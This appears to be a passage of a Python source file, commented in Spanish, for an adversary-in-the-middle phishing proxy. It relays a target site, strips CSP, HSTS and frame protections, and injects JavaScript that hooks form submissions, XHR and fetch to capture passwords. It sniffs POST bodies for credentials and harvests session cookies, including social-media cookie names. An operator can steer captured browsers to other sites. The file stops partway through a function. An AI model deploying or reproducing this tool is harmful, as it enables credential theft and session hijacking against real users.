#!/usr/bin/env python3
"""
MITM Reverse Proxy v3.1

DIFERENCIA CLAVE entre redirect y openurl:
  redirect <scope> <url>  → manda al browser FUERA del proxy (302 directo).
                            Puede ser https://google.com o /path.
                            El browser va ahí y ya no pasa por aquí.

  openurl <scope> <url>   → carga la URL DENTRO del proxy.
                            El proxy la fetcha, reescribe HTML, inyecta JS,
                            captura credenciales y cookies.
                            El browser nunca "sale" — todo sigue proxied.
                            Funciona con sitios externos (google, etc...)
                            o con paths del target actual.

Otros cambios vs v3.0:
  - IDs numéricos por cliente (#1, #2, ...)
  - Modo sesión: select <ID>
  - next_redirect dispara en siguiente acción real (no polling)
  - Todos los comandos aceptan ID o IP

Uso:
  python3 mitm_proxy_v3.py --target http://localhost:8080
  python3 mitm_proxy_v3.py --target http://localhost:8080 --port 9090 --ssl
  python3 mitm_proxy_v3.py --target http://localhost:8080 --fr -O log.txt

Solo para pruebas de seguridad autorizadas.
"""

import os, sys, json, re, ssl, socket, threading, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote, urljoin
import warnings
warnings.filterwarnings('ignore')

try:
    import requests
    from flask import Flask, request as freq, Response, make_response
except ImportError:
    os.system("pip3 install requests flask -q")
    import requests
    from flask import Flask, request as freq, Response, make_response

try: requests.packages.urllib3.disable_warnings()
except: pass

BASE = os.path.dirname(os.path.abspath(__file__))

# ── Colores ──────────────────────────────────────────────────────────────────
R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'
M='\033[95m'; CY='\033[96m'; W='\033[97m'; BOLD='\033[1m'
DIM='\033[2m'; RST='\033[0m'

# ── Headers que NO se copian ─────────────────────────────────────────────────
SKIP_REQ = {'host','content-length','transfer-encoding','connection',
            'keep-alive','upgrade','proxy-connection','te','trailers'}

STRIP_RESP = {'transfer-encoding','connection','keep-alive','content-encoding',
              'content-length','content-security-policy','content-security-policy-report-only',
              'strict-transport-security','x-frame-options','x-content-type-options',
              'x-xss-protection','permissions-policy','cross-origin-opener-policy',
              'cross-origin-embedder-policy','cross-origin-resource-policy',
              'expect-ct','public-key-pins','report-to','nel'}

CRED_RE = re.compile(
    r'(pass|pwd|password|passwd|secret|token|auth|key|session|credential|'
    r'login|user|email|usr|account|pin|otp|code|2fa|mfa|enc_password|'
    r'username|phone|cel|numero)', re.I)


# ═══════════════════════════════════════════════════════════════════════════════
class MITMProxy:
# ═══════════════════════════════════════════════════════════════════════════════

    def __init__(self, target, port=8080, certfile=None, keyfile=None,
                 follow_redirects=False, output_file=None):

        self.port            = port
        self.certfile        = certfile
        self.keyfile         = keyfile
        self.follow_redirects= follow_redirects
        self.logfile         = os.path.join(BASE, "captured.json")
        self.output_file     = output_file
        self.captures        = 0
        self.reqs            = 0
        self.lock            = threading.Lock()

        # Sesiones por IP (cookie jar propio por cliente)
        self.sessions        = {}   # ip  → requests.Session
        self.store           = {}   # ip  → {cookies, tokens}

        # ── Sistema de IDs de clientes ────────────────────────────────────────
        self._id_counter     = 0
        self._ip_to_id       = {}   # ip  → int
        self._id_to_ip       = {}   # int → ip
        self._client_info    = {}   # ip  → dict(id, first_seen, last_seen, reqs)
        self._id_lock        = threading.Lock()

        # ── Redirects ─────────────────────────────────────────────────────────
        self.redirect_lock   = threading.Lock()
        # Permanentes (polling): 'global' → url, ip → url
        self.redirects       = {}
        # One-time (polling): ip → (url, used)
        self.one_redirects   = {}
        # Siguiente request: disparado en _handle()
        self.next_redirect   = None

        # Capturas
        self.credentials     = []
        self.all_cookies     = {}   # ip → {name: value}

        # ── openurl: URL completa a proxiar para cada cliente ─────────────────
        # ip → (url_completa, nuevo_host, nuevo_origin, nuevo_dominos_set)
        # Se consume en _handle() y sirve esa URL en vez del target normal
        self.pending_open    = {}   # ip → url_absoluta
        self.pending_lock    = threading.Lock()

        # ── Target ────────────────────────────────────────────────────────────
        t = target.strip()
        if not t.startswith(('http://','https://')): t = 'https://' + t
        p            = urlparse(t)
        self.scheme  = p.scheme
        self.host    = p.netloc
        self.origin  = f"{p.scheme}://{p.netloc}"
        self.target_path = p.path if p.path and p.path != '/' else ''

        # Dominios del target para reescribir URLs
        base = self.host.replace('www.','')
        self.domains = set()
        for pfx in ['','www.','static.','api.','m.','i.','graph.','edge-chat.',
                     'upload.','scontent.','platform.','connect.','web.',
                     'accounts.','login.','l.','lm.','external.','z-m-scontent.',
                     'rupload.','edge-upload.','star.','pixel.','an.','tr.']:
            self.domains.add(f"{pfx}{base}")

        self.cdn_re = re.compile(
            r'(?:scontent|static|cdn|media|edge|z-m-scontent)[^./]*\.' + re.escape(base))

        # ── Flask ─────────────────────────────────────────────────────────────
        self.app = Flask(__name__)
        import logging; logging.getLogger('werkzeug').setLevel(logging.ERROR)

        # Captura JS
        @self.app.route('/__ml__', methods=['POST'])
        def _ml():
            self._js_capture()
            return '', 204

        # Polling de redirect — SOLO sirve redirects instantáneos (redirect cmd)
        # next_redirect y openurl NO van aquí.
        @self.app.route('/__check_redirect__', methods=['GET'])
        def _check_redirect():
            ip = freq.remote_addr
            # ¿Hay un openurl pendiente? → manda al /__open__ del proxy (proxy-interno)
            with self.pending_lock:
                if ip in self.pending_open:
                    from urllib.parse import quote as _q
                    target_url = self.pending_open.pop(ip)
                    encoded = _q(target_url, safe='')
                    # Ruta interna del proxy, el browser sigue DENTRO del proxy
                    internal = f"/__open__?u={encoded}"
                    return Response(internal, mimetype='text/plain')
            # ¿Hay redirect normal (salida)?
            url_r = self._get_polling_redirect(ip)
            if url_r:
                if not url_r.startswith(('http://','https://')):
                    url_r = 'http://' + url_r
                return Response(url_r, mimetype='text/plain')
            return Response('', status=204)

        # ── RUTA ESPECIAL: /__open__  → sirve cualquier URL a través del proxy
        @self.app.route('/__open__', methods=['GET','POST'])
        def _open_proxy():
            """
            Punto de entrada para openurl.
            El browser llega aquí (sigue dentro del proxy).
            El proxy fetcha la URL real, reescribe, inyecta JS, captura.
            """
            from urllib.parse import unquote as _uq
            ip   = freq.remote_addr
            sess = self._sess(ip)
            cid  = self.get_client_id(ip) or '?'

            raw_url = freq.args.get('u','').strip()
            if not raw_url:
                return Response("<h1>400 — falta parámetro u</h1>", status=400)

            target_url = _uq(raw_url)
            if not target_url.startswith(('http://','https://')):
                target_url = 'https://' + target_url

            parsed     = urlparse(target_url)
            ext_host   = parsed.netloc
            ext_origin = f"{parsed.scheme}://{parsed.netloc}"

            print(f"  {CY}[OPEN] #{cid} proxy-interno → {target_url}{RST}")

            # Headers para el sitio externo
            hdrs = {
                'Host':            ext_host,
                'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/125.0.0.0 Safari/537.36',
                'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'identity',
            }

            # Crear sesión temporal limpia para el sitio externo
            ext_sess_key = f"__open__{ip}__{ext_host}"
            if ext_sess_key not in self.sessions:
                s = requests.Session()
                s.verify = False
                from requests.adapters import HTTPAdapter as _HA
                _a = _HA(pool_connections=10, pool_maxsize=20)
                s.mount("http://",  _a)
                s.mount("https://", _a)
                self.sessions[ext_sess_key] = s
            ext_sess = self.sessions[ext_sess_key]

            # Fetch
            try:
                resp = ext_sess.request(
                    method='GET', url=target_url, headers=hdrs,
                    allow_redirects=True, timeout=25, verify=False, stream=False
                )
            except Exception as e:
                print(f"  {R}[OPEN] Error fetch: {e}{RST}")
                return Response(f"<h1>502 Bad Gateway</h1><p>{e}</p>", status=502)

            # Capturar cookies del sitio externo
            interesting = {}
            for c in ext_sess.cookies:
                nl = c.name.lower()
                if any(x in nl for x in ['session','token','auth','sid','jwt','access',
                        'refresh','login','sso','csrf']):
                    interesting[c.name] = c.value[:200]
            if interesting:
                self._log(ip, 'COOKIES', target_url, interesting)

            resp_ct   = resp.headers.get('Content-Type','')
            resp_body = resp.content

            # Reescribir dominios externos a rutas del proxy
            # /__open__?u=<encoded> para que links sigan proxied
            def _rw_ext(text, origin, host):
                """Reescribe URLs del sitio externo para que pasen por /__open__"""
                from urllib.parse import quote as _q2
                # href="https://host/path" → href="/__open__?u=https%3A...
                def _replace_url(m):
                    attr   = m.group(1)   # href=  src=  action=
                    quote  = m.group(2)   # " o '
                    url_v  = m.group(3)
                    # Ignorar data:, javascript:, mailto:, #, vacío
                    if not url_v or url_v.startswith(('data:','javascript:','mailto:','#','//')):
                        return m.group(0)
                    # Hacer absoluta
                    abs_url = url_v
                    if url_v.startswith('/'):
                        abs_url = f"{origin}{url_v}"
                    elif not url_v.startswith('http'):
                        abs_url = f"{origin}/{url_v}"
                    # Solo reescribir si es del mismo host externo
                    p2 = urlparse(abs_url)
                    if p2.netloc == host or p2.netloc == f"www.{host}" or host == f"www.{p2.netloc}":
                        encoded_url = _q2(abs_url, safe='')
                        return f'{attr}{quote}/__open__?u={encoded_url}{quote}'
                    return m.group(0)
                # Reemplazar href, src, action
                text = re.sub(r'(href\s*=\s*|src\s*=\s*|action\s*=\s*)(["\'])(.*?)\2',
                              _replace_url, text, flags=re.IGNORECASE)
                # También URLs absolutas en texto plano (JS inline)
                text = text.replace(f"https://{host}", "/__open_pfx__")
                text = text.replace(f"http://{host}",  "/__open_pfx__")
                text = text.replace("/__open_pfx__", f"/__open__?u={_q2(origin,safe='')}")
                return text

            if 'text/html' in resp_ct or 'xhtml' in resp_ct:
                try:
                    enc  = resp.encoding or 'utf-8'
                    text = resp_body.decode(enc, errors='replace')
                    text = _rw_ext(text, ext_origin, ext_host)
                    # Inyectar JS de captura y polling
                    js = self._inject_js()
                    polling_js = '''<script type="text/javascript">
(function(){
    var _ci=setInterval(function(){
        fetch("/__check_redirect__",{method:"GET",cache:"no-cache"})
        .then(function(r){return r.status===200?r.text():null;})
        .then(function(t){if(t&&t.length>0){clearInterval(_ci);window.location.replace(t);}})
        .catch(function(){});
    },500);
})();
</script>'''
                    inject = js + polling_js
                    for tag in ['</head>','</body>','</html>']:
                        if tag in text: text = text.replace(tag, f'{inject}{tag}', 1); break
                    else: text += inject
                    resp_body = text.encode('utf-8', errors='replace')
                except Exception as e:
                    print(f"  {Y}[OPEN] Rewrite error: {e}{RST}")
            elif any(x in resp_ct for x in ['javascript','text/css']):
                try:
                    enc  = resp.encoding or 'utf-8'
                    text = resp_body.decode(enc, errors='replace')
                    text = text.replace(ext_origin, "").replace(f"//{ext_host}", "")
                    resp_body = text.encode('utf-8', errors='replace')
                except: pass

            # Construir respuesta Flask
            fr = make_response(resp_body, resp.status_code)
            for k, v in resp.headers.items():
                kl = k.lower()
                if kl in STRIP_RESP:   continue
                if kl == 'set-cookie': continue
                if kl == 'location':
                    # Redirige dentro del proxy
                    from urllib.parse import quote as _q3
                    abs_loc = v if v.startswith('http') else f"{ext_origin}{v}"
                    fr.headers[k] = f"/__open__?u={_q3(abs_loc,safe='')}"
                    continue
                fr.headers[k] = v
            # Pasar cookies del externo al browser
            ck_list = []
            if hasattr(resp.raw,'headers') and hasattr(resp.raw.headers,'getlist'):
                ck_list = resp.raw.headers.getlist('Set-Cookie')
            for ck in ck_list:
                fr.headers.add('Set-Cookie', self._fix_ck(ck))

            print(f"  {G}[OPEN]{RST} {resp.status_code} {target_url[:70]}")
            return fr

        # Proxy catch-all (target original)
        @self.app.route('/', defaults={'path':''}, methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        @self.app.route('/<path:path>',            methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        def _proxy(path):
            return self._handle(path)

    # ──────────────────────────────────────────────────────────────────────────
    #  GESTIÓN DE CLIENTES (IDs)
    # ──────────────────────────────────────────────────────────────────────────
    def _register_client(self, ip):
        """Registra IP y asigna ID incremental si es nuevo."""
        with self._id_lock:
            if ip not in self._ip_to_id:
                self._id_counter += 1
                cid = self._id_counter
                self._ip_to_id[ip]  = cid
                self._id_to_ip[cid] = ip
                self._client_info[ip] = {
                    'id':         cid,
                    'ip':         ip,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen':  datetime.now().isoformat(),
                    'reqs':       0,
                }
                print(f"  {G}[+] Nuevo cliente #{cid} → {ip}{RST}")
            else:
                info = self._client_info[ip]
                info['last_seen'] = datetime.now().isoformat()
                info['reqs']     += 1
        return self._ip_to_id[ip]

    def get_client_id(self, ip):
        return self._ip_to_id.get(ip)

    def get_client_ip(self, cid):
        """Devuelve IP a partir de ID (int o str como '3' o '#3')."""
        if isinstance(cid, str): cid = cid.lstrip('#')
        try:    cid = int(cid)
        except: return None
        return self._id_to_ip.get(cid)

    def list_clients(self):
        """Retorna lista de clientes ordenada por ID."""
        with self._id_lock:
            snap = dict(self._client_info)
        out = []
        for ip, info in snap.items():
            out.append({
                'id':         info['id'],
                'ip':         ip,
                'first_seen': info['first_seen'],
                'last_seen':  info['last_seen'],
                'reqs':       info['reqs'],
                'cookies':    len(self.store.get(ip, {}).get('cookies', {})),
            })
        return sorted(out, key=lambda x: x['id'])

    def _resolve_to_ip(self, scope):
        """Convierte scope (ID numérico, '#N', o IP literal) a IP."""
        if scope == 'global': return 'global'
        s = str(scope).lstrip('#')
        try:
            ip = self.get_client_ip(int(s))
            return ip if ip else scope
        except ValueError:
            return scope   # Asumir IP directa

    # ──────────────────────────────────────────────────────────────────────────
    #  SESIÓN requests por cliente
    # ──────────────────────────────────────────────────────────────────────────
    def _sess(self, ip):
        if ip not in self.sessions:
            s = requests.Session()
            s.verify = False
            s.max_redirects = 30
            s.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/125.0.0.0 Safari/537.36',
            })
            from requests.adapters import HTTPAdapter
            a = HTTPAdapter(pool_connections=20, pool_maxsize=40)
            s.mount("http://",  a)
            s.mount("https://", a)
            self.sessions[ip] = s
        self._register_client(ip)
        return self.sessions[ip]

    # ──────────────────────────────────────────────────────────────────────────
    #  HANDLER PRINCIPAL
    # ──────────────────────────────────────────────────────────────────────────
    def _handle(self, path):
        self.reqs += 1
        ip   = freq.remote_addr
        sess = self._sess(ip)
        cid  = self.get_client_id(ip) or '?'
        method = freq.method

        # ── next_redirect: DISPARA AQUÍ (no en polling) ──────────────────────
        with self.redirect_lock:
            if self.next_redirect is not None:
                nr = self.next_redirect
                self.next_redirect = None
                print(f"  {CY}[→] next_redirect #{cid} ({ip}) → {nr}{RST}")
                if not nr.startswith(('http://','https://')):
                    nr = 'http://' + nr
                return Response(
                    f'<html><head><meta http-equiv="refresh" content="0;url={nr}"></head></html>',
                    status=302, headers={'Location': nr}
                )

        # URL destino
        tpath = f"/{path}"
        qs = freq.query_string.decode('utf-8', errors='replace')
        if qs: tpath += f"?{qs}"
        url = f"{self.origin}{tpath}"

        # Headers al backend
        hdrs = {}
        for k, v in freq.headers:
            if k.lower() in SKIP_REQ: continue
            if k.lower() in ('referer','origin'): v = self._to_real(v)
            hdrs[k] = v
        hdrs['Host']            = self.host
        hdrs['Accept-Encoding'] = 'identity'

        body = freq.get_data() or None
        ct   = freq.content_type or ''

        if method in ('POST','PUT','PATCH') and body:
            self._sniff_post(ip, body, ct, url)

        for cn, cv in freq.cookies.items():
            sess.cookies.set(cn, cv)

        # ── Request al backend ────────────────────────────────────────────────
        if self.follow_redirects:
            final_resp = self._full_relay(sess, method, url, hdrs, body, ip)
        else:
            try:
                final_resp = sess.request(
                    method=method, url=url, headers=hdrs,
                    data=body if method in ('POST','PUT','PATCH') else None,
                    allow_redirects=False, timeout=25, verify=False, stream=False
                )
            except Exception as e:
                print(f"  {R}[!] Error: {e}{RST}")
                return Response(f"<h1>502</h1><p>{e}</p>", status=502)

        self._sniff_cookies(ip, sess, url)

        # ── Respuesta ─────────────────────────────────────────────────────────
        resp_body = final_resp.content
        resp_ct   = final_resp.headers.get('Content-Type','')
        status    = final_resp.status_code

        if 'text/html' in resp_ct or 'xhtml' in resp_ct:
            resp_body = self._rw_html(resp_body, final_resp.encoding)
        elif any(x in resp_ct for x in ['javascript','text/css','text/xml']):
            resp_body = self._rw_text(resp_body, final_resp.encoding)
        elif 'json' in resp_ct:
            self._sniff_json(ip, resp_body, url)
            resp_body = self._rw_text(resp_body, final_resp.encoding)

        fr = make_response(resp_body, status)

        for k, v in final_resp.headers.items():
            kl = k.lower()
            if kl in STRIP_RESP:   continue
            if kl == 'location':   v = self._to_proxy(v)
            if kl == 'set-cookie': continue
            fr.headers[k] = v

        # Set-Cookie
        raw_sc = []
        if hasattr(final_resp, '_all_cookies'):
            raw_sc = final_resp._all_cookies
        else:
            if hasattr(final_resp.raw, 'headers') and hasattr(final_resp.raw.headers, 'getlist'):
                raw_sc = final_resp.raw.headers.getlist('Set-Cookie')
            if not raw_sc:
                sc = final_resp.headers.get('Set-Cookie')
                if sc: raw_sc = [sc]
        for sc in raw_sc:
            fr.headers.add('Set-Cookie', self._fix_ck(sc))

        # ── Inyectar JS de polling en HTML ────────────────────────────────────
        if 'text/html' in resp_ct:
            polling_js = '''<script type="text/javascript">
(function(){
    var _ci = setInterval(function(){
        fetch("/__check_redirect__",{method:"GET",cache:"no-cache"})
        .then(function(r){ return r.status===200 ? r.text() : null; })
        .then(function(t){ if(t&&t.length>0){ clearInterval(_ci); window.location.replace(t); } })
        .catch(function(){});
    },500);
})();
</script>'''
            body_str = resp_body if isinstance(resp_body,str) else resp_body.decode('utf-8',errors='replace')
            if '<head>'  in body_str: body_str = body_str.replace('<head>',  '<head>' +polling_js, 1)
            elif '<head' in body_str: body_str = re.sub(r'<head([^>]*)>', r'<head\1>'+polling_js, body_str, count=1)
            elif '<html>' in body_str: body_str = body_str.replace('<html>', '<html>'+polling_js, 1)
            elif '<html' in body_str:  body_str = re.sub(r'<html([^>]*)>', r'<html\1>'+polling_js, body_str, count=1)
            else: body_str = polling_js + body_str
            fr.set_data(body_str.encode('utf-8') if isinstance(resp_body,bytes) else body_str)

        mc  = G if method == 'GET' else Y
        sc_c= G if status < 300 else (CY if status < 400 else R)
        print(f"  {mc}{method:6}{RST} {sc_c}{status}{RST} {DIM}#{cid}{RST} {tpath[:60]}")
        return fr

    # ──────────────────────────────────────────────────────────────────────────
    #  REDIRECT: POLLING (global, per-ip, one-time)
    # ──────────────────────────────────────────────────────────────────────────
    def _get_polling_redirect(self, ip):
        """Devuelve URL de redirect para polling (instantáneos).
        next_redirect NO se incluye — ese dispara en _handle()."""
        with self.redirect_lock:
            # 1. One-time (auto-limpia)
            if ip in self.one_redirects:
                target, used = self.one_redirects[ip]
                if not used:
                    self.one_redirects[ip] = (target, True)
                    return target
                else:
                    del self.one_redirects[ip]
            # 2. Permanente por IP
            if ip in self.redirects:
                return self.redirects[ip]
            # 3. Global permanente
            if 'global' in self.redirects:
                return self.redirects['global']
        return None

    # ──────────────────────────────────────────────────────────────────────────
    #  OPENURL — carga una URL DENTRO del proxy (captura, reescribe, inyecta)
    # ──────────────────────────────────────────────────────────────────────────
    def openurl(self, target, url):
        """
        Abre una URL a través del proxy.
        El browser NO sale: el proxy fetcha el sitio, reescribe HTML,
        inyecta JS de captura y sirve todo proxied.

        target : 'all' | ID numérico | IP
        url    : URL completa (https://google.com/...) o path (/settings)
        """
        # Normalizar URL — si es path relativo, construir URL completa del target
        url = url.strip()
        if url.startswith('/'):
            abs_url = f"{self.origin}{url}"
        elif not url.startswith(('http://','https://')):
            abs_url = f"https://{url}"
        else:
            abs_url = url

        if str(target).lower() == 'all':
            with self._id_lock:
                ips = list(self._client_info.keys())
            if not ips:
                print(f"  {Y}[!] Sin clientes conectados{RST}")
                return
            with self.pending_lock:
                for ip in ips:
                    self.pending_open[ip] = abs_url
            ids_str = ', '.join([f"#{self._ip_to_id[ip]}" for ip in ips])
            print(f"  {CY}[OPEN] openurl all → {abs_url}  [{ids_str}]{RST}")
        else:
            ip = self._resolve_to_ip(target)
            if not ip or ip not in self._ip_to_id:
                print(f"  {R}[!] Cliente '{target}' no existe{RST}")
                return
            cid = self._ip_to_id[ip]
            with self.pending_lock:
                self.pending_open[ip] = abs_url
            print(f"  {CY}[OPEN] openurl #{cid} ({ip}) → {abs_url}{RST}")

    # ──────────────────────────────────────────────────────────────────────────
    #  REDIRECT SETTERS / CLEANERS
    #  redirect → salida del proxy (browser va a esa URL directamente)
    # ──────────────────────────────────────────────────────────────────────────
    def set_redirect(self, scope, target):
        """
        Redirect de SALIDA: manda el browser a esa URL y lo saca del proxy.
        Puede ser https://google.com (externo) o /path (sale igual).
        El browser deja de pasar por aquí después del redirect.
        """
        # Asegurar protocolo para URLs externas
        t = target.strip()
        if not t.startswith(('http://','https://','/')):
            t = 'https://' + t
        with self.redirect_lock:
            if scope == 'global':
                self.redirects['global'] = t
                print(f"  {G}[R] Global redirect (salida) → {t}{RST}")
            else:
                ip = self._resolve_to_ip(scope)
                self.redirects[ip] = t
                cid = self._ip_to_id.get(ip, '?')
                print(f"  {G}[R] Redirect #{cid} ({ip}) (salida) → {t}{RST}")

    def set_next_redirect(self, target):
        """Redirect en el siguiente REQUEST REAL (no polling)."""
        with self.redirect_lock:
            self.next_redirect = target
        print(f"  {G}[R] next_redirect → {target}  (dispara en siguiente acción real){RST}")

    def set_one_redirect(self, scope, target):
        """Redirect instantáneo una sola vez (via polling)."""
        ip = self._resolve_to_ip(scope)
        with self.redirect_lock:
            self.one_redirects[ip] = (target, False)
        cid = self._ip_to_id.get(ip, '?')
        print(f"  {G}[R] One-time redirect #{cid} ({ip}) → {target}{RST}")

    def clean_redirect(self, scope=None):
        with self.redirect_lock:
            if scope is None:
                self.redirects.clear()
                self.one_redirects.clear()
                self.next_redirect = None
                print(f"  {Y}[R] Todos los redirects limpiados{RST}")
            elif scope == 'next':
                self.next_redirect = None
                print(f"  {Y}[R] next_redirect limpiado{RST}")
            elif scope == 'global':
                self.redirects.pop('global', None)
                print(f"  {Y}[R] Global redirect limpiado{RST}")
            else:
                ip = self._resolve_to_ip(scope)
                removed = False
                if ip in self.redirects:
                    del self.redirects[ip]; removed = True
                if ip in self.one_redirects:
                    del self.one_redirects[ip]; removed = True
                if removed:
                    cid = self._ip_to_id.get(ip,'?')
                    print(f"  {Y}[R] Redirect #{cid} ({ip}) limpiado{RST}")
                else:
                    print(f"  {Y}[!] Sin redirect para '{scope}'{RST}")

    # ──────────────────────────────────────────────────────────────────────────
    #  FULL RELAY (modo --fr)
    # ──────────────────────────────────────────────────────────────────────────
    def _full_relay(self, sess, method, url, hdrs, body, ip):
        print(f"  {M}[FR] Full Relay{RST}")
        all_cookies, current_url, current_method = [], url, method
        current_body, current_hdrs = body, dict(hdrs)
        visited = set()

        for hop in range(20):
            key = f"{current_method}:{current_url}"
            if key in visited:
                print(f"  {Y}[FR] Loop detectado{RST}"); break
            visited.add(key)
            try:
                resp = sess.request(
                    method=current_method, url=current_url, headers=current_hdrs,
                    data=current_body if current_method in ('POST','PUT','PATCH') else None,
                    allow_redirects=False, timeout=25, verify=False, stream=False)
            except Exception as e:
                print(f"  {R}[FR] Error: {e}{RST}")
                if hop > 0: resp._all_cookies = all_cookies; return resp
                raise
            hop_ck = []
            if hasattr(resp.raw,'headers') and hasattr(resp.raw.headers,'getlist'):
                hop_ck = resp.raw.headers.getlist('Set-Cookie')
            if hop_ck:
                all_cookies.extend(hop_ck)
                for cs in hop_ck:
                    try:
                        line = cs.split(';')[0].strip()
                        if '=' in line:
                            n, v = line.split('=',1)
                            sess.cookies.set(n.strip(), v.strip())
                    except: pass
                print(f"  {G}[FR] Hop {hop+1}: {resp.status_code} | {len(hop_ck)} cookies{RST}")
            if resp.status_code not in (301,302,303,307,308):
                resp._all_cookies = all_cookies; return resp
            location = resp.headers.get('Location','')
            if not location: resp._all_cookies = all_cookies; return resp
            if not location.startswith('http'): location = urljoin(current_url, location)
            print(f"  {DIM}  └→ {resp.status_code} → {urlparse(location).path}{RST}")
            if resp.status_code in (301,302,303): current_method = 'GET'; current_body = None
            parsed = urlparse(location)
            current_hdrs = {
                'Host': parsed.netloc,
                'User-Agent': sess.headers.get('User-Agent',''),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'identity',
                'Referer': current_url,
            }
            current_url = location

        resp._all_cookies = all_cookies; return resp

    # ──────────────────────────────────────────────────────────────────────────
    #  REWRITE
    # ──────────────────────────────────────────────────────────────────────────
    def _to_proxy(self, url):
        if not url: return url
        for d in self.domains:
            url = url.replace(f"https://{d}","").replace(f"http://{d}","")
        return url or '/'

    def _to_real(self, url):
        if not url: return url
        p = urlparse(url)
        if not p.netloc or str(self.port) in str(p.netloc):
            return f"{self.origin}{p.path or '/'}{'?'+p.query if p.query else ''}"
        return url

    def _fix_ck(self, s):
        if not s: return s
        s = s.replace('__Secure-','').replace('__Host-','')
        s = re.sub(r';\s*[Dd]omain=[^;]*','', s)
        s = re.sub(r';\s*[Ss]ecure\b','', s)
        s = re.sub(r';\s*[Ss]ame[Ss]ite\s*=\s*\w+','; SameSite=Lax', s)
        s = re.sub(r';\s*[Pp]ath=[^;]*','; Path=/', s)
        return s

    def _dec(self, b, enc):
        for e in [enc,'utf-8','latin-1']:
            if e:
                try: return b.decode(e)
                except: continue
        return b.decode('utf-8', errors='replace')

    def _url_replace(self, text):
        for d in self.domains:
            text = text.replace(f"https://{d}","").replace(f"http://{d}","")
            text = text.replace(f"https:\\/\\/{d}","").replace(f"http:\\/\\/{d}","")
            text = text.replace(f"//{d}","")
        text = self.cdn_re.sub("", text)
        return text

    def _rw_html(self, body, enc):
        t = self._url_replace(self._dec(body, enc))
        js = self._inject_js()
        for tag in ['</head>','</body>','</html>']:
            if tag in t: t = t.replace(tag, f'{js}{tag}', 1); break
        else: t += js
        return t.encode('utf-8', errors='replace')

    def _rw_text(self, body, enc):
        return self._url_replace(self._dec(body, enc)).encode('utf-8', errors='replace')

    def _inject_js(self):
        return '''<script>
(function(){
var P=function(d){try{navigator.sendBeacon("/__ml__",JSON.stringify(d));}catch(e){
try{var x=new XMLHttpRequest();x.open("POST","/__ml__",true);
x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(d));}catch(e2){}}};
document.addEventListener("submit",function(e){
var f=e.target;if(!f||f.tagName!=="FORM")return;
var d={};var inps=f.querySelectorAll("input,textarea,select");
for(var i=0;i<inps.length;i++){var inp=inps[i];
if(inp.name&&inp.value){d[inp.name]=inp.value;
if(inp.type==="password")d["__PWD__"]=inp.value;}}
P({t:"f",a:f.action,d:d});},true);
var XO=XMLHttpRequest.prototype.open,XS=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){this._m=m;this._u=u;return XO.apply(this,arguments);};
XMLHttpRequest.prototype.send=function(b){
if(b&&(this._m==="POST"||this._m==="PUT"))
P({t:"x",m:this._m,u:this._u,b:typeof b==="string"?b:null});
return XS.apply(this,arguments);};
if(window.fetch){var F=window.fetch;
window.fetch=function(u,o){o=o||{};
if(o.body&&(o.method==="POST"||o.method==="PUT")){
try{var s=null;
if(typeof o.body==="string")s=o.body;
else if(o.body instanceof URLSearchParams)s=o.body.toString();
if(s)P({t:"h",m:o.method,u:typeof u==="string"?u:"",b:s});}catch(e){}}
return F.apply(this,arguments);};}
})();
</script>'''

    # ──────────────────────────────────────────────────────────────────────────
    #  SNIFFERS
    # ──────────────────────────────────────────────────────────────────────────
    def _sniff_post(self, ip, body, ct, url):
        try: bs = body.decode('utf-8', errors='replace')
        except: return
        fields = {}
        if 'urlencoded' in ct or ('&' in bs and '=' in bs):
            try:
                for k, v in parse_qs(bs, keep_blank_values=True).items():
                    fields[k] = v[0] if v else ''
            except: pass
        elif 'json' in ct:
            try:
                j = json.loads(bs)
                if isinstance(j, dict): self._flat(j, fields)
            except: pass
        elif 'multipart' in ct:
            for m in re.finditer(r'name="([^"]+)"[\r\n]+([^\r\n-]+)', bs):
                fields[m.group(1)] = m.group(2).strip()
        if not fields and '=' in bs:
            for pair in bs.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    fields[unquote(k)] = unquote(v)
        if not fields: return
        sens = {k: v for k, v in fields.items() if CRED_RE.search(k) and v}
        if sens: self._log(ip,'CREDENTIALS', url, sens, fields)
        else:    self._log(ip,'POST_DATA',   url, fields)

    def _flat(self, obj, r, pfx=''):
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v,(dict,list)): self._flat(v, r, f)
                else: r[f] = str(v) if v is not None else ''
        elif isinstance(obj, list):
            for i, x in enumerate(obj): self._flat(x, r, f"{pfx}[{i}]")

    def _sniff_cookies(self, ip, sess, url):
        interesting = {}
        for c in sess.cookies:
            nl = c.name.lower()
            if any(x in nl for x in ['session','token','auth','sid','jwt','access',
                    'refresh','login','sso','csrf','c_user','xs','fr','ds_user',
                    'datr','sb','dpr','wd','presence']):
                interesting[c.name] = c.value[:200]
        if interesting:
            prev = self.store.get(ip,{}).get('cookies',{})
            new_ck = {k:v for k,v in interesting.items() if k not in prev or prev[k]!=v}
            if new_ck:
                self._log(ip,'COOKIES', url, new_ck)
                with self.lock:
                    if ip not in self.store: self.store[ip]={'cookies':{},'tokens':[]}
                    self.store[ip]['cookies'].update(interesting)

    def _sniff_json(self, ip, body, url):
        try:
            j = json.loads(body.decode('utf-8', errors='replace'))
            if isinstance(j, dict):
                tk = {}; self._find_tk(j, tk)
                if tk:
                    self._log(ip,'TOKENS', url, tk)
                    with self.lock:
                        if ip not in self.store: self.store[ip]={'cookies':{},'tokens':[]}
                        self.store[ip]['tokens'].append(tk)
        except: pass

    def _find_tk(self, obj, r, pfx=''):
